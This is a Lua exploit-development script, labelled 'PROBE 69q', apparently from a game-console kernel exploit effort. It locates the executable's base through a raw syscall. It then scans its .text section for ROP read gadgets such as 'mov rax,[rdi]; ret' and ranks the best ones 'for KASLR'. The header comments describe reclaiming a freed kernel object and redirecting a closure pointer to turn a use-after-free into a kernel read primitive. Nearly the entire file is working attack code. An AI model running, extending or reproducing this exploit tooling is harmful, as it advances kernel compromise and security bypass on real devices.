-- CRASH_CLASS: LOW
-- PROBE 69q: Scan eboot .text for memory-read gadgets
--
-- Context: If we reclaim the freed R object (48B, zone 0x1ab59e0) with
-- controlled data, we need a userland gadget to READ from the kernel
-- address we plant. The CClosure +0x20 redirect can call an eboot RX
-- function, but we need the right gadget to dereference a pointer argument.
--
-- Looking for:
--   mov eax, [rdi]; ret          (0x8B 0x07 0xC3)
--   mov rax, [rdi]; ret          (0x48 0x8B 0x07 0xC3)
--   mov eax, [rdi+N]; ret        (0x8B 0x47 N 0xC3)
--   mov rax, [rdi+N]; ret        (0x48 0x8B 0x47 N 0xC3)
--   mov eax, [rsi]; ret          (0x8B 0x06 0xC3)
--   mov rax, [rsi]; ret          (0x48 0x8B 0x06 0xC3)
--   movzx eax, byte [rdi]; ret   (0x0F 0xB6 0x07 0xC3)
--   movzx eax, word [rdi]; ret   (0x0F 0xB7 0x07 0xC3)
--   Also: mov rdi,[rdi];ret patterns for pointer chasing

print("=== PROBE 69q: EBOOT READ GADGET SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

-- Eboot .text size from dynlib_get_info
local tsz_lo = rd(N(ib) + 0x110) or 0
local tsz_hi = rd(N(ib) + 0x114) or 0
if tsz_lo < 0 then tsz_lo = tsz_lo + 0x100000000 end
local text_size = tsz_hi * 0x100000000 + tsz_lo
print(string.format("eboot=%08X%08X text_size=0x%X (%d KB)", ehi, elo, text_size, text_size / 1024))

if text_size == 0 or text_size > 0x800000 then
    text_size = 0x4A0000  -- fallback ~4.6MB
    print("  using fallback text_size")
end

-- ============================================================
-- SCAN
-- ============================================================
local found = {}
local BATCH = 0x1000  -- read 4096 bytes per batch into a buffer

print("")
print("Scanning " .. math.floor(text_size / 1024) .. " KB of eboot .text...")
print("")

local scan_buf = memory.alloc(BATCH + 16)
local total_scanned = 0
local check_interval = 0x40000  -- report progress every 256KB

for chunk_start = 0, text_size - BATCH, BATCH do
    if not alive() then print("DEAD during scan"); break end

    -- Read chunk into scan_buf byte by byte (eboot is RX, safe to read)
    -- Actually read as dwords for speed
    for off = 0, BATCH - 4, 4 do
        local v = rd(N(eb) + chunk_start + off)
        if v then wd(N(scan_buf) + off, v) end
    end

    -- Scan for patterns
    for off = 0, BATCH - 4 do
        local function rb(o)
            if o < 0 or o >= BATCH then return nil end
            local dw = rd(N(scan_buf) + (o - o % 4))
            if not dw then return nil end
            local shift = (o % 4) * 8
            return math.floor(dw / (2 ^ shift)) % 256
        end

        local b0 = rb(off)
        local b1 = rb(off + 1)
        local b2 = rb(off + 2)
        local b3 = rb(off + 3)
        if not b0 or not b1 or not b2 then break end

        local abs_off = chunk_start + off

        -- mov eax, [rdi]; ret  (8B 07 C3)
        if b0 == 0x8B and b1 == 0x07 and b2 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov eax,[rdi]; ret", len = 3 })
        end

        -- mov rax, [rdi]; ret  (48 8B 07 C3)
        if b0 == 0x48 and b1 == 0x8B and b2 == 0x07 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov rax,[rdi]; ret", len = 4 })
        end

        -- mov eax, [rdi+N]; ret  (8B 47 XX C3)
        if b0 == 0x8B and b1 == 0x47 and b3 == 0xC3 then
            local disp = b2
            table.insert(found, { off = abs_off, pat = string.format("mov eax,[rdi+0x%02X]; ret", disp), len = 4 })
        end

        -- mov rax, [rdi+N]; ret  (48 8B 47 XX C3)
        if b3 then
            local b4 = rb(off + 4)
            if b0 == 0x48 and b1 == 0x8B and b2 == 0x47 and b4 == 0xC3 then
                table.insert(found, { off = abs_off, pat = string.format("mov rax,[rdi+0x%02X]; ret", b3), len = 5 })
            end
        end

        -- mov eax, [rsi]; ret  (8B 06 C3)
        if b0 == 0x8B and b1 == 0x06 and b2 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov eax,[rsi]; ret", len = 3 })
        end

        -- mov rax, [rsi]; ret  (48 8B 06 C3)
        if b0 == 0x48 and b1 == 0x8B and b2 == 0x06 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov rax,[rsi]; ret", len = 4 })
        end

        -- movzx eax, byte [rdi]; ret  (0F B6 07 C3)
        if b0 == 0x0F and b1 == 0xB6 and b2 == 0x07 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "movzx eax,byte[rdi]; ret", len = 4 })
        end

        -- movzx eax, word [rdi]; ret  (0F B7 07 C3)
        if b0 == 0x0F and b1 == 0xB7 and b2 == 0x07 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "movzx eax,word[rdi]; ret", len = 4 })
        end

        -- mov rdi, [rdi]; ret  (48 8B 3F C3) — pointer chase
        if b0 == 0x48 and b1 == 0x8B and b2 == 0x3F and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov rdi,[rdi]; ret (chase)", len = 4 })
        end

        -- mov eax, [rcx]; ret  (8B 01 C3)
        if b0 == 0x8B and b1 == 0x01 and b2 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov eax,[rcx]; ret", len = 3 })
        end

        -- mov rax, [rcx]; ret  (48 8B 01 C3)
        if b0 == 0x48 and b1 == 0x8B and b2 == 0x01 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov rax,[rcx]; ret", len = 4 })
        end

        -- mov eax, [rdx]; ret  (8B 02 C3)
        if b0 == 0x8B and b1 == 0x02 and b2 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov eax,[rdx]; ret", len = 3 })
        end

        -- mov rax, [rdx]; ret  (48 8B 02 C3)
        if b0 == 0x48 and b1 == 0x8B and b2 == 0x02 and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov rax,[rdx]; ret", len = 4 })
        end

        -- mov eax, [rdi+rcx]; ret  (8B 04 0F C3)
        if b0 == 0x8B and b1 == 0x04 and b2 == 0x0F and b3 == 0xC3 then
            table.insert(found, { off = abs_off, pat = "mov eax,[rdi+rcx]; ret", len = 4 })
        end
    end

    total_scanned = total_scanned + BATCH
    if total_scanned % check_interval == 0 then
        print(string.format("  scanned %d KB / %d KB, found %d gadgets so far",
            total_scanned / 1024, text_size / 1024, #found))
    end
end

-- ============================================================
-- RESULTS
-- ============================================================
print("")
print(string.format("SCAN COMPLETE: %d gadgets found in %d KB", #found, total_scanned / 1024))
print("")

if #found == 0 then
    print("No read gadgets found. The scan may have missed non-standard encodings.")
    print("Consider: longer prefix patterns, REX.W variants, or SIB byte forms.")
else
    -- Deduplicate and sort by offset
    table.sort(found, function(a, b) return a.off < b.off end)

    -- Print all
    for i, g in ipairs(found) do
        -- Verify the bytes at the found offset
        local hex = ""
        for j = 0, g.len - 1 do
            local b = nil
            pcall(function()
                local dw = memory.read_dword(N(eb) + g.off + (j - j % 4))
                b = math.floor(N(dw) / (2 ^ ((j % 4) * 8))) % 256
            end)
            if b then hex = hex .. string.format("%02X ", b) end
        end
        print(string.format("  [%2d] eboot+0x%06X: %-35s  %s", i, g.off, g.pat, hex))
    end

    -- Highlight most useful
    print("")
    print("=== BEST GADGETS FOR KASLR ===")
    for _, g in ipairs(found) do
        if g.pat:find("rax,%[rdi%]") or g.pat:find("eax,%[rdi%]") then
            print(string.format("  ★ eboot+0x%06X: %s", g.off, g.pat))
        end
    end
    for _, g in ipairs(found) do
        if g.pat:find("chase") then
            print(string.format("  ★ eboot+0x%06X: %s", g.off, g.pat))
        end
    end
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 69q COMPLETE ===")
